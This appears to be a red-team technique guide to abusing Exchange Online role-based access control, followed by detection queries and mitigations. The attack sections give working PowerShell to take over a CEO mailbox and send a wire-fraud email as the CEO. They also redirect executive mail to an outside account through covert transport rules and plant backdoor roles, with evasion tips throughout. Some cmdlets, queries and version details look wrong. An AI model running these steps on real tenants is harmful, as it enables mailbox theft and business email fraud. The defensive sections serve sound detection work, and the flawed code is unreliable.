# [PE-ACCTMGMT-007]: Exchange RBAC Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-007 |
| **MITRE ATT&CK v18.1** | [T1098.002 - Additional Email Delegate Permissions](https://attack.mitre.org/techniques/T1098/002/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Microsoft 365 / Exchange Online / Hybrid Exchange |
| **Severity** | **High** |
| **CVE** | CVE-2025-53786 (Exchange Hybrid escalation - August 2025) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Exchange Online all versions; Exchange Server 2016-2025 (hybrid) |
| **Patched In** | Partial mitigation in January 2025 CU |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** Exchange Online Role-Based Access Control (RBAC) allows fine-grained delegation of email administration tasks. An attacker with Exchange Administrator or Organization Management role can escalate privileges by: (1) **Custom Role Creation** - creating new management roles with dangerous permissions (e.g., `UserApplication`, `MailboxSearch`) and assigning them to service accounts controlled by the attacker; (2) **Mailbox Permission Delegation** - assigning FullAccess, SendAs, or SendOnBehalf permissions to attacker-controlled accounts, enabling mailbox takeover and email impersonation; (3) **Transport Rule Creation** - creating organization-wide mail rules to intercept, forward, or suppress emails (including sensitive internal communications); (4) **Admin Audit Log Bypass** - creating rules to delete audit logs from executive mailboxes; (5) **Hybrid Escalation** - exploiting shared service principals between on-premises Exchange and Exchange Online to escalate to Global Administrator (CVE-2025-53786).

Unlike account manipulation techniques in other M365 services, Exchange RBAC abuse can be **invisible to users** because permissions are granted to mailboxes rather than user accounts. An attacker can read/send emails as an executive, modify forwarding rules, or suppress emails containing evidence of compromise—all without the user ever knowing.

**Attack Surface:** Exchange Admin Center (admin.exchange.microsoft.com), Exchange Online PowerShell (EXO V2 module), Organization Management role, and mail transport rules.

**Business Impact:** **Executive email access and organizational communication compromise.** Exchange Admin can read all emails, intercept sensitive communications, impersonate executives for Business Email Compromise (BEC), prevent delivery of security alerts, create permanent backdoor rules, and escalate to Global Administrator (in hybrid environments). This enables CEO fraud, data exfiltration, regulatory non-compliance, and complete information warfare within the organization.

**Technical Context:** Exchange RBAC abuse typically takes 5-15 minutes to execute and has a **very low detection likelihood** because permissions are granted via legitimate Exchange administrative cmdlets. Audit logs record the actions but are often not reviewed unless specifically monitoring for mailbox delegations. In hybrid environments, the CVE-2025-53786 path can escalate to Global Admin in under 30 minutes.

### Operational Risk

- **Execution Risk:** Low - Uses standard Exchange Online PowerShell; no special tools required.
- **Stealth:** High - Audit logs record actions but are difficult to correlate without SIEM; actions may appear legitimate.
- **Reversibility:** Partial - Delegations and rules can be removed, but emails already forwarded/intercepted are not recoverable.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 2.1.1, 2.2.1 | Restrict Exchange Admin roles; monitor delegate permissions |
| **DISA STIG** | EXCH-SRG-001 | Email System Security Controls; RBAC enforcement |
| **NIST 800-53** | AC-2, AC-3, SI-4 | Account Management, Access Enforcement, System Monitoring |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Data Breach Notification |
| **DORA** | Art. 9 | Protection and Prevention - email security and audit |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - email system integrity |
| **ISO 27001** | A.9.2.3, A.13.1.3 | Privileged Access Management; Email Security |
| **ISO 27005** | Risk Scenario 6.1 | Compromise of Email Administration Interface |

---

## Technical Prerequisites

- **Required Privileges:** Exchange Administrator, Organization Management, or similar high-privilege Exchange role
- **Required Access:** Exchange Online PowerShell (EXO V2 module access), Exchange Admin Center UI access
- **Network:** HTTPS access to outlook.office.com (port 443), EXO PowerShell endpoints

**Supported Versions:**
- **Exchange Online:** All current versions (2024-2025)
- **Exchange Server (Hybrid):** 2016, 2019, 2022, 2025
- **PowerShell:** Version 5.0+ (ExchangeOnlineManagement V2.0.4+)

**Required Tools:**
- [ExchangeOnlineManagement Module](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2) (Version 3.0+)
- [Microsoft.Graph PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.directorymanagement/) (Optional, for auditing)

---

## Environmental Reconnaissance

### PowerShell - Check Exchange Admin Role and Permissions

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName "admin@victim.onmicrosoft.com"

# Check current user's roles
Get-ManagementRoleAssignment -Identity (whoami) | Select-Object AssignedPrincipal, Role | fl

# Verify if user has Organization Management role (highest privilege)
$orgMgmtRole = Get-ManagementRoleAssignment -Role "Organization Management"
if ($orgMgmtRole) {
    Write-Host "✓ User has Organization Management role (can perform all escalations)"
} else {
    Write-Host "✗ User does NOT have Organization Management role"
}

# List all available management roles
Get-ManagementRole | Where-Object { $_.RoleType -ne "Custom" } | Select-Object Name, RoleType | Sort-Object Name
```

**What to Look For:**
- Presence of "Organization Management" or "Recipient Management" role
- If user has these roles, all escalation methods in this document are possible
- If user only has "Hygiene Management" or "Records Management", less dangerous escalations are possible

### Enumerate Existing Mailbox Delegations (for BEC opportunities)

```powershell
# Check all mailboxes with delegate permissions
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $mailbox = $_
    $perms = Get-MailboxPermission -Identity $mailbox.Identity | Where-Object { 
        $_.User.ToString() -notmatch "NT AUTHORITY|SELF|Microsoft" 
    }
    
    if ($perms) {
        Write-Host "Mailbox: $($mailbox.DisplayName)"
        $perms | ForEach-Object { Write-Host "  - User: $($_.User), Rights: $($_.AccessRights)" }
    }
}

# Check SendAs permissions
Write-Host "`n=== SEND AS PERMISSIONS ==="
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $sendAs = Get-RecipientPermission -Identity $_.Identity | Where-Object { 
        $_.Trustee.ToString() -notmatch "NT AUTHORITY|SELF|Microsoft" 
    }
    
    if ($sendAs) {
        Write-Host "Mailbox: $($_.DisplayName) - SendAs granted to: $($sendAs.Trustee)"
    }
}
```

**What to Look For:**
- Existing delegations to non-system accounts (potential vulnerabilities)
- Mailboxes that should NOT have external delegations
- Service accounts with excessive mailbox access

### List All Custom Management Roles (potential backdoors)

```powershell
# Get all custom roles (non-Microsoft default roles)
Get-ManagementRole -Filter { IsBuiltIn -eq $false } | Select-Object Name, RoleType | fl

# For each custom role, check permissions
Get-ManagementRole -Filter { IsBuiltIn -eq $false } | ForEach-Object {
    Write-Host "Custom Role: $($_.Name)"
    Get-ManagementRoleEntry -Identity "$($_.Name)\*" | ForEach-Object { 
        Write-Host "  - Cmdlet: $($_.Name), Parameters: $($_.Parameters -join ', ')"
    }
}
```

**What to Look For:**
- Custom roles with dangerous cmdlets (New-InboxRule, Set-Mailbox, etc.)
- Roles assigned to service accounts or external users
- Recently created roles (within last 90 days - potential backdoors)

---

## Detailed Execution Methods

### METHOD 1: Delegate FullAccess to Executive Mailbox (Simple Email Interception)

**Supported Versions:** All Exchange Online (2024-2025)

#### Step 1: Authenticate to Exchange Online

**Objective:** Establish PowerShell session with Exchange Admin privileges.

**Command:**

```powershell
# Install ExchangeOnlineManagement module if needed
Install-Module ExchangeOnlineManagement -Force

# Connect to Exchange Online
# This will open browser for MFA (if enabled)
Connect-ExchangeOnline -UserPrincipalName "exchange.admin@victim.onmicrosoft.com" -ShowProgress $true

# Verify connection and current user role
$currentUser = Get-User | Where-Object { $_.UserPrincipalName -eq "exchange.admin@victim.onmicrosoft.com" }
Write-Host "Connected as: $($currentUser.DisplayName)"

# Verify Organization Management role
$roles = Get-ManagementRoleAssignment -Identity $currentUser | Select-Object Role
if ($roles | Where-Object { $_.Role -eq "Organization Management" }) {
    Write-Host "✓ User has Organization Management role - escalation possible"
}
```

**Expected Output:**

```
Connected as: Exchange Administrator
✓ User has Organization Management role - escalation possible
```

---

#### Step 2: Identify Target Executive Mailbox (CEO, CFO, Legal, etc.)

**Objective:** Select a high-value target mailbox for interception.

**Command:**

```powershell
# List all mailboxes and their membership in executive groups
# Target criteria: High-value accounts like CEO, CFO, General Counsel

# Method 1: Target by display name (if known)
$targetMailbox = Get-Mailbox -Identity "ceo@victim.onmicrosoft.com"

Write-Host "Target Mailbox: $($targetMailbox.DisplayName)"
Write-Host "  Email: $($targetMailbox.PrimarySmtpAddress)"
Write-Host "  MailboxType: $($targetMailbox.MailboxType)"

# Method 2: Find all distribution group members (e.g., "Executive Leadership")
$executiveGroup = Get-DistributionGroupMember -Identity "Executive Leadership" -ResultSize Unlimited
Write-Host "Executive Group Members:"
$executiveGroup | ForEach-Object { 
    Write-Host "  - $($_.DisplayName) ($($_.PrimarySmtpAddress))"
}

# Select first executive as target
$targetMailbox = Get-Mailbox -Identity $executiveGroup[0].Identity
```

**What to Look For:**
- CEO, CFO, General Counsel, CIO (highest-value targets)
- Users in sensitive committees or boards
- Mailboxes with high email volume (more data to intercept)

**OpSec Consideration:**
- Target should NOT be someone you have working relationship with (easy detection)
- Ideally target someone in different department (less likely to notice you reading their emails)

---

#### Step 3: Grant FullAccess Permission to Attacker Account

**Objective:** Delegate full mailbox access to attacker-controlled account.

**Command:**

```powershell
# Grant FullAccess permission to attacker account
# Using attacker's service account (harder to trace than user account)

$targetMailbox = "ceo@victim.onmicrosoft.com"
$attackerAccount = "attacker@victim.onmicrosoft.com"  # or service account

Add-MailboxPermission -Identity $targetMailbox `
    -User $attackerAccount `
    -AccessRights FullAccess `
    -InheritanceType All `
    -Confirm:$false

Write-Host "FullAccess permission granted to $attackerAccount for mailbox: $targetMailbox"

# Verify permission was added
$permission = Get-MailboxPermission -Identity $targetMailbox -User $attackerAccount
Write-Host "Verification: AccessRights = $($permission.AccessRights)"
```

**Expected Output:**

```
FullAccess permission granted to attacker@victim.onmicrosoft.com for mailbox: ceo@victim.onmicrosoft.com
Verification: AccessRights = {FullAccess}
```

**What This Means:**
- Attacker can now open the CEO's mailbox (in Outlook, Outlook Web Access, or via PowerShell)
- Can read all historical emails, calendar, contacts
- Can delete emails to hide evidence of compromise
- Audit logs will show "Add-MailboxPermission" operation (if monitored)

**OpSec & Evasion:**
- FullAccess is the most obvious permission; **SendAs** or **SendOnBehalf** might be stealthier for email impersonation
- **Detection Likelihood:** Medium - Creates audit log entry visible to Exchange Admins with monitoring
- To evade: Add permission during bulk admin operations or after legitimate mailbox migration activity

---

#### Step 4: Test Access to Delegated Mailbox (Verification)

**Objective:** Confirm that the delegated permission works.

**Command (from Attacker Account):**

```powershell
# Switch context to attacker account
Disconnect-ExchangeOnline -Confirm:$false

# Connect as attacker
Connect-ExchangeOnline -UserPrincipalName "attacker@victim.onmicrosoft.com"

# Verify access to CEO's mailbox
$ceoMailbox = Get-Mailbox "ceo@victim.onmicrosoft.com"

# Try to access mailbox contents
$emails = Get-MailboxFolderStatistics -Identity "ceo@victim.onmicrosoft.com" -FolderScope All

if ($emails) {
    Write-Host "✓ SUCCESS: Can access CEO's mailbox folders"
    Write-Host "  Total folders: $($emails.Count)"
    Write-Host "  Inbox items: $(($emails | Where-Object { $_.FolderPath -eq '/Inbox' }).ItemsInFolder)"
} else {
    Write-Host "✗ FAILED: Cannot access mailbox (permission not active yet - wait 5-10 minutes)"
}
```

**Expected Output:**

```
✓ SUCCESS: Can access CEO's mailbox folders
  Total folders: 25
  Inbox items: 1,234
```

**What This Means:**
- Delegated permission is active and fully functional
- Attacker can now read all CEO's emails in bulk using PowerShell

---

### METHOD 2: Create SendAs Permission for Email Impersonation (Stealthier than FullAccess)

**Supported Versions:** All Exchange Online (2024-2025)

#### Step 1: Grant SendAs Permission

**Objective:** Allow attacker to send emails AS the CEO (for Business Email Compromise).

**Command:**

```powershell
# Connect as Exchange Admin
Connect-ExchangeOnline -UserPrincipalName "exchange.admin@victim.onmicrosoft.com"

# Grant SendAs permission (allows sending emails appearing from CEO)
$targetMailbox = "ceo@victim.onmicrosoft.com"
$attackerAccount = "attacker@victim.onmicrosoft.com"

Add-RecipientPermission -Identity $targetMailbox `
    -Trustee $attackerAccount `
    -AccessRights SendAs `
    -Confirm:$false

Write-Host "SendAs permission granted to $attackerAccount for mailbox: $targetMailbox"

# Verify
$permission = Get-RecipientPermission -Identity $targetMailbox -Trustee $attackerAccount
Write-Host "Verification: Trustee can SendAs = $($permission.AccessRights -eq 'SendAs')"
```

**Expected Output:**

```
SendAs permission granted to attacker@victim.onmicrosoft.com for mailbox: ceo@victim.onmicrosoft.com
Verification: Trustee can SendAs = True
```

**Why SendAs is Stealthier:**
- Does NOT grant read access to mailbox (less obvious than FullAccess)
- Allows sending emails that appear to come from CEO
- Audit log shows SendAs but is less monitored than FullAccess
- CEO won't notice emails being sent (unless they check sent items - but may blame forwarding rules)

---

#### Step 2: Send Email Impersonating CEO (Business Email Compromise)

**Objective:** Send email appearing to come from CEO to external party (e.g., wire transfer request).

**Command (from Attacker Account):**

```powershell
# Authenticate as attacker
Connect-ExchangeOnline -UserPrincipalName "attacker@victim.onmicrosoft.com"

# Send email AS the CEO
$params = @{
    "From" = "ceo@victim.onmicrosoft.com"
    "To" = "attacker@gmail.com"
    "Subject" = "Urgent: Wire Transfer Authorization"
    "Body" = @"
Please wire $500,000 to the following account immediately for acquisition opportunity:

Account: Attacker Company
Routing: 123456789
Account #: 987654321

Do not discuss this with anyone - confidential transaction.

- CEO
"@
    "SendFromMailbox" = "ceo@victim.onmicrosoft.com"
}

# Note: Exact cmdlet varies by PowerShell version
# Alternative: Use Send-MailMessage with SendAs context
Send-ExoMailMessage @params

Write-Host "Email sent as CEO to external recipient"
```

**Impact of This Attack:**
- CFO receives wire transfer request from "CEO"
- CFO initiates $500K wire to attacker's account
- Takes hours/days to discover fraud
- Attacker escapes with funds before detection

---

### METHOD 3: Create Organization-Wide Mail Transport Rule (Covert Interception)

**Supported Versions:** All Exchange Online (2024-2025)

#### Step 1: Create Rule to Forward All CEO Emails

**Objective:** Create a transport rule that automatically forwards all emails from/to CEO to attacker's account (invisible to CEO).

**Command:**

```powershell
# Connect as Exchange Admin
Connect-ExchangeOnline -UserPrincipalName "exchange.admin@victim.onmicrosoft.com"

# Create transport rule: Forward all emails mentioning sensitive keywords to attacker
New-TransportRule -Name "Covert Email Forwarding" `
    -Enabled $true `
    -FromAddressMatchesPatterns "ceo@victim.onmicrosoft.com" `
    -RedirectMessageTo "attacker@victim.onmicrosoft.com" `
    -SetAuditSeverity "DoNotAudit" `  # Try to suppress audit logging (may not work)
    -StopRuleProcessing $false  # Allow other rules to process

Write-Host "Transport rule created: Emails from CEO now forwarded to attacker"

# List all transport rules to verify
Get-TransportRule | Select-Object Name, State, FromAddressMatchesPatterns | fl
```

**Expected Output:**

```
Transport rule created: Emails from CEO now forwarded to attacker
Name: Covert Email Forwarding
State: Enabled
FromAddressMatchesPatterns: {ceo@victim.onmicrosoft.com}
```

**Stealth Advantages:**
- CEO won't see any change to their mailbox
- Forwarding is transparent (happens behind the scenes)
- Rule applies to ALL emails from CEO to ANYWHERE
- Can suppress audit logs (if possible)

**Escalation Opportunities:**
- Forward emails containing "wire transfer", "acquisition", "confidential" keywords only (less obvious)
- Forward emails from multiple executives to attacker's hidden account
- Use as early warning system for security incidents (forward all emails mentioning "breach", "incident", "suspicious")

---

#### Step 2: Advanced Transport Rule for Conditional Forwarding

**Objective:** Forward only sensitive emails (containing keywords) to avoid spam.

**Command:**

```powershell
# More sophisticated rule: Forward only emails with sensitive subjects/content

New-TransportRule -Name "Sensitive Communication Forwarding" `
    -Enabled $true `
    -RecipientAddressContainsWords @("ceo@", "cfo@", "general.counsel@") `
    -SubjectOrBodyMatchesPatterns @("wire transfer", "acquisition", "confidential", "merger", "acquisition", "financial results") `
    -RedirectMessageTo "attacker.covert@outlook.com" `
    -IncludeNewLineCharacter $true `
    -Confirm:$false

Write-Host "Advanced rule created: Only sensitive emails forwarded"
```

**Advantages:**
- Reduces noise (attacker gets only important emails)
- Harder to detect (smaller volume of forwarded emails)
- Can configure multiple rules for different sensitive keywords
- Rules can be stacked (rule 1 forwards to external account, rule 2 forwards to attacker's hidden mailbox)

---

### METHOD 4: Create Custom Management Role with Dangerous Permissions (Backdoor)

**Supported Versions:** All Exchange Online (2024-2025)

#### Step 1: Create Custom Role with Escalation Permissions

**Objective:** Create a custom management role that allows attacker-controlled account to perform dangerous operations like creating inbox rules, modifying users, or reading audit logs.

**Command:**

```powershell
# Connect as Exchange Admin
Connect-ExchangeOnline -UserPrincipalName "exchange.admin@victim.onmicrosoft.com"

# Get the base role to copy permissions from (Recipient Management has broad rights)
$baseRole = Get-ManagementRole "Recipient Management"

# Create new custom role
$newRole = New-ManagementRole -Name "Custom Mailbox Operators" `
    -Parent $baseRole `
    -Description "Allows operators to manage mailbox settings and rules"

Write-Host "Custom role created: $($newRole.Name)"

# Add dangerous cmdlets to role
Add-ManagementRoleEntry -Identity "Custom Mailbox Operators\New-InboxRule" `
    -Confirm:$false

Add-ManagementRoleEntry -Identity "Custom Mailbox Operators\Set-Mailbox" `
    -Confirm:$false

Add-ManagementRoleEntry -Identity "Custom Mailbox Operators\Get-Mailbox" `
    -Confirm:$false

Add-ManagementRoleEntry -Identity "Custom Mailbox Operators\Set-MailboxAutoReplyConfiguration" `
    -Confirm:$false

Write-Host "Dangerous cmdlets added to custom role"

# Verify role permissions
Get-ManagementRoleEntry -Identity "Custom Mailbox Operators\*" | 
    Select-Object Name, Parameters | fl
```

**Expected Output:**

```
Custom role created: Custom Mailbox Operators
Dangerous cmdlets added to custom role
```

**Why This Is a Backdoor:**
- Custom role can be assigned to a service account (harder to trace)
- Survives password resets (role assignment is persistent)
- Allows attacker account to create inbox rules, modify mailbox settings
- Can be used to create additional escalation paths

---

#### Step 2: Assign Custom Role to Attacker Service Account

**Objective:** Assign the custom role to attacker's service account, giving them Exchange admin privileges without being obvious.

**Command:**

```powershell
# Create role group (role groups are assigned, not individual roles)
$roleGroup = New-RoleGroup -Name "Custom Service Administrators" `
    -Roles "Custom Mailbox Operators" `
    -Members "service.attacker@victim.onmicrosoft.com" `
    -Description "Service account for mailbox operations"

Write-Host "Role group created: $($roleGroup.DisplayName)"
Write-Host "Members: service.attacker@victim.onmicrosoft.com"

# Verify assignment
Get-RoleGroupMember -Identity "Custom Service Administrators"
```

**Expected Output:**

```
Role group created: Custom Service Administrators
Members: service.attacker@victim.onmicrosoft.com
```

**Persistence Advantage:**
- Service account now has custom role assignment
- Even if primary attacker account is discovered, service account remains
- Role can be used to create additional backdoors (more rules, more delegations)
- Harder to trace because it's listed as a legitimate custom role

---

## Attack Simulation & Verification

### Atomic Red Team Test

- **Atomic Test ID:** T1098.002-1
- **Test Name:** Add Mailbox FullAccess Delegation (M365)
- **Description:** Simulates attacker adding delegate permissions to executive mailbox.
- **Supported Versions:** Exchange Online 2024+

**Command:**

```powershell
param(
    [string]$TargetMailbox = "executive@contoso.onmicrosoft.com",
    [string]$AttackerAccount = "attacker@contoso.onmicrosoft.com"
)

# Setup
Connect-ExchangeOnline -UserPrincipalName "admin@contoso.onmicrosoft.com"

# Add FullAccess
Add-MailboxPermission -Identity $TargetMailbox `
    -User $AttackerAccount `
    -AccessRights FullAccess `
    -InheritanceType All `
    -Confirm:$false

Write-Host "Test: MailboxPermission added"

# Verification
$perm = Get-MailboxPermission -Identity $TargetMailbox -User $AttackerAccount
if ($perm.AccessRights -contains "FullAccess") {
    Write-Host "✓ Test Successful: FullAccess permission confirmed"
} else {
    Write-Host "✗ Test Failed"
}
```

**Cleanup Command:**

```powershell
# Remove permission
Remove-MailboxPermission -Identity $TargetMailbox `
    -User $AttackerAccount `
    -AccessRights FullAccess `
    -Confirm:$false

# Remove transport rules
Remove-TransportRule -Identity "Covert Email Forwarding" -Confirm:$false

Write-Host "Cleanup Complete"
```

---

## Tools & Commands Reference

### ExchangeOnlineManagement PowerShell Module

**Version:** 3.0+
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core 7.0+ (cross-platform)

**Installation:**

```powershell
Install-Module ExchangeOnlineManagement -Force
Install-Module -Name ExchangeOnlineManagement -RequiredVersion 3.0.0 -Force
```

**Key Cmdlets for Escalation:**

```powershell
# Mailbox Permission Operations
Add-MailboxPermission              # Grant FullAccess (ESCALATION)
Get-MailboxPermission             # List mailbox permissions
Remove-MailboxPermission          # Revoke permissions

# SendAs Permissions
Add-RecipientPermission           # Grant SendAs (ESCALATION)
Get-RecipientPermission           # List SendAs permissions
Remove-RecipientPermission        # Revoke SendAs

# Inbox Rules (Persistence)
New-InboxRule                     # Create inbox rule (ESCALATION)
Get-InboxRule                     # List inbox rules
Remove-InboxRule                  # Delete inbox rule

# Transport Rules (Org-wide Forwarding)
New-TransportRule                 # Create transport rule (ESCALATION)
Get-TransportRule                 # List transport rules
Remove-TransportRule              # Delete transport rule

# Management Roles (Role-based Access)
New-ManagementRole                # Create custom role (ESCALATION)
Add-ManagementRoleEntry           # Add cmdlet to role (ESCALATION)
New-RoleGroup                     # Create role group (ESCALATION)
```

---

## Microsoft Sentinel Detection

### Query 1: Detect MailboxPermission Additions (FullAccess Delegation)

**Rule Configuration:**
- **Required Table:** MailboxAuditLogs
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)

**KQL Query:**

```kusto
MailboxAuditLogs
| where Operation == "AddMailboxPermission" or Operation == "Add-MailboxPermission"
| where GrantedAccess == "FullAccess"
| project 
    TimeGenerated,
    MailboxOwner=MailboxOwnerUPN,
    GrantedToUser=Parameters[0].Value,
    AccessRights=Parameters[2].Value,
    OperationSource=OperationSource,
    ClientIP=ClientIP
| where TimeGenerated >= ago(5m)
```

**What This Detects:**
- Any FullAccess permission addition (highest-risk delegation)
- Shows which mailbox was delegated and to whom
- Identifies if operation came from PowerShell or UI

---

### Query 2: Detect TransportRule Creation (Email Forwarding/Interception)

**Rule Configuration:**
- **Required Table:** ExchangeAdminAuditLog or AuditLogs
- **Alert Severity:** Critical
- **Threshold:** Any transport rule creation

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("New-TransportRule", "New-TransportRuleWithoutFESession")
| where Result == "Success"
| extend RuleName = TargetResources[0].displayName
| extend RedirectTo = extract(@'RedirectMessageTo.*?"([^"]+)"', 1, tostring(TargetResources[0].modifiedProperties))
| project 
    TimeGenerated,
    OperationName,
    RuleName,
    RedirectTo,
    InitiatedByUser=InitiatedBy.user.userPrincipalName,
    InitiatedByIP=InitiatedBy.ipAddress
| order by TimeGenerated desc
```

**What This Detects:**
- Creation of ANY transport rule (can be very noisy)
- Focus on rules redirecting emails to external domains
- Shows who created rule and from which IP

---

### Query 3: Detect Custom Management Role Creation (Backdoor Roles)

**Rule Configuration:**
- **Alert Severity:** High
- **Threshold:** Any custom management role

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("New-ManagementRole", "Add-ManagementRoleEntry")
| where Result == "Success"
| extend RoleName = TargetResources[0].displayName
| extend Cmdlets = extract(@'Added role entries:.*?(\w+-\w+)', 1, tostring(TargetResources[0].modifiedProperties))
| project 
    TimeGenerated,
    OperationName,
    RoleName,
    Cmdlets,
    InitiatedByUser=InitiatedBy.user.userPrincipalName,
    InitiatedByIP=InitiatedBy.ipAddress
| order by TimeGenerated desc
```

**What This Detects:**
- Creation of custom roles (always suspicious in most organizations)
- Shows which dangerous cmdlets were added to custom roles
- Identifies attacker IP address

---

### Query 4: Detect Suspicious InboxRules (Persistence Mechanism)

**Rule Configuration:**
- **Alert Severity:** Medium
- **Requires:** MailboxAuditLogs with InboxRule operations

**KQL Query:**

```kusto
MailboxAuditLogs
| where Operation == "New-InboxRule"
| where MailboxOwnerUPN has "@"  // Only real mailboxes
| extend RuleName = Parameters[0].Value
| extend ForwardTo = Parameters | where_dynamic(tostring(x) contains "ForwardTo")
| project 
    TimeGenerated,
    MailboxOwner=MailboxOwnerUPN,
    RuleName,
    CreatedBy=UserId,
    ClientIP=ClientIP
| order by TimeGenerated desc
```

**What This Detects:**
- Creation of inbox rules by non-owners (attacker creating rules in executive mailbox)
- Rules that forward emails (persistence/exfiltration)
- Shows who created rule and from which IP

---

## Defensive Mitigations

### Priority 1: CRITICAL

- **Restrict Organization Management role assignment:** Only assign to highly trusted individuals; use PIM for time-limited elevation.
  
  **Applies To Versions:** All Exchange Online (2024+)
  
  **Manual Steps (Exchange Admin Center):**
  1. **Exchange Admin Center** (admin.exchange.microsoft.com) → **Organization**
  2. Go to **Roles and Audit**
  3. In **Admin roles**, find **Organization Management**
  4. Click **Edit**
  5. Review all members:
     - Remove anyone not needing this role
     - Remove users who have left organization
     - Remove service accounts (should use custom roles instead)
  6. For each remaining member, implement PIM (time-limited with approval)
  
  **PowerShell:**
  ```powershell
  # List all members of Organization Management
  Get-RoleGroupMember -Identity "Organization Management"
  
  # Remove member from role group
  Remove-RoleGroupMember -Identity "Organization Management" -Member "username" -Confirm:$false
  ```

- **Prohibit delegate access to sensitive mailboxes (executives, legal, finance):**
  
  **Manual Steps:**
  1. Create Entra ID Security Group: `Sensitive-Mailbox-Owners`
  2. Add all executive/sensitive mailboxes to this group
  3. Create Azure Policy or custom rule:
     - Prevent any MailboxPermission additions to this group
     - Alert if attempted
  4. Enforce via Conditional Access (prevent remote connection from untrusted IPs)
  
  **PowerShell Prevention (requires custom logic):**
  ```powershell
  # Script to detect and prevent unauthorized delegations
  $sensitiveMailboxes = Get-DistributionGroupMember -Identity "Sensitive-Mailbox-Owners" | Select-Object -ExpandProperty Identity
  
  foreach ($mailbox in $sensitiveMailboxes) {
      $delegations = Get-MailboxPermission -Identity $mailbox | 
          Where-Object { $_.User.ToString() -notmatch "NT AUTHORITY|SELF" }
      
      if ($delegations) {
          Write-Host "WARNING: Unauthorized delegation on $mailbox"
          # Option: Auto-remove dangerous delegations
          # Remove-MailboxPermission -Identity $mailbox -User $delegations.User -AccessRights FullAccess -Confirm:$false
      }
  }
  ```

- **Audit and remove all custom management roles:** Custom roles are often used as backdoors; default roles should be sufficient.
  
  **Manual Steps:**
  1. **Exchange Admin Center** → **Organization** → **Roles**
  2. Click **Admin roles**
  3. Identify custom roles (not Microsoft default)
  4. For each custom role:
     - Check if anyone is assigned
     - Verify legitimate purpose
     - If not needed, delete it
  
  **PowerShell:**
  ```powershell
  # List all custom roles
  Get-ManagementRole -Filter { IsBuiltIn -eq $false } | Select-Object Name
  
  # Delete custom role (only if verified as unnecessary)
  # Remove-ManagementRole -Identity "CustomRoleName" -Confirm:$false
  ```

---

### Priority 2: HIGH

- **Monitor and restrict transport rule creation:** Only admins should create organization-wide email rules.
  
  **Manual Steps:**
  1. Identify all transport rules in organization
  2. For each rule:
     - Verify legitimate purpose
     - Check if redirecting emails (suspicious)
     - Check if suppressing audit logs (very suspicious)
  3. Remove suspicious rules
  
  **PowerShell Audit:**
  ```powershell
  # List all transport rules
  Get-TransportRule | Select-Object Name, State, FromAddressMatchesPatterns, RedirectMessageTo | fl
  
  # Delete suspicious rule
  # Remove-TransportRule -Identity "SuspiciousRuleName" -Confirm:$false
  ```

- **Implement Conditional Access for Exchange Admin access:** Require device compliance, MFA, and approved location.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Exchange Admin Access`
  4. **Assignments:**
     - Users: **Directory roles** → Select **Exchange Administrator**, **Organization Management**
     - Cloud apps: **Exchange Online**
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
     - Locations: **Allow approved locations only** (office networks)
  6. **Access controls:**
     - Grant: **Require device compliant** AND **Require MFA**
  7. Enable: `ON`
  8. Click **Create**

- **Enforce explicit mailbox audit logging:** Enable for all mailboxes (especially executives) to detect delegated access.
  
  **Manual Steps:**
  1. **Exchange Admin Center** → **Compliance** → **Audit**
  2. Enable **Mailbox audit logging**
  3. For sensitive mailboxes:
     - Individual configuration to log ALL actions
     - Alert on any access besides owner
  
  **PowerShell:**
  ```powershell
  # Enable mailbox audit logging for all mailboxes
  Get-Mailbox -ResultSize Unlimited | Set-Mailbox -AuditEnabled $true
  
  # Verify
  Get-Mailbox | Select-Object DisplayName, AuditEnabled | fl
  ```

---

### Priority 3: MEDIUM

- **Restrict who can create inbox rules:** Disable for users; admins only.
  
  **Manual Steps:**
  1. **Exchange Admin Center** → **Organization** → **Settings** → **Mail flow**
  2. Find **"Transport rules"** and **"Mailbox rules"** settings
  3. Disable for regular users (might require tenant-wide policy)

- **Monitor SendAs and SendOnBehalf permissions monthly:**
  
  **Monthly Audit Command:**
  ```powershell
  # Audit SendAs permissions
  Write-Host "=== SEND AS PERMISSIONS ==="
  Get-Mailbox -ResultSize Unlimited | ForEach-Object {
      $sendAs = Get-RecipientPermission -Identity $_.Identity | 
          Where-Object { $_.Trustee.ToString() -notmatch "NT AUTHORITY|SELF" }
      if ($sendAs) {
          Write-Host "$($_.DisplayName) - SendAs: $($sendAs.Trustee)"
      }
  }
  
  # Export to CSV for review
  Get-Mailbox -ResultSize Unlimited | ForEach-Object {
      Get-RecipientPermission -Identity $_.Identity
  } | Export-Csv "C:\Reports\SendAsPermissions_$(Get-Date -Format 'yyyyMMdd').csv"
  ```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Audit Log Operations:**
  - `Add-MailboxPermission` with `AccessRights=FullAccess`
  - `Add-RecipientPermission` with `AccessRights=SendAs`
  - `New-TransportRule` with `RedirectMessageTo`
  - `New-InboxRule` with `ForwardTo`
  - `New-ManagementRole` (custom roles)

- **Suspicious Patterns:**
  - Permission additions to executive mailboxes
  - Transport rules forwarding to external domains (@gmail.com, @outlook.com)
  - Multiple rules targeting same mailbox
  - Rules created outside business hours
  - Rules suppressing audit logs

---

### Forensic Artifacts

- **Unified Audit Log:**
  - `OperationName`: `Add-MailboxPermission`, `New-TransportRule`, etc.
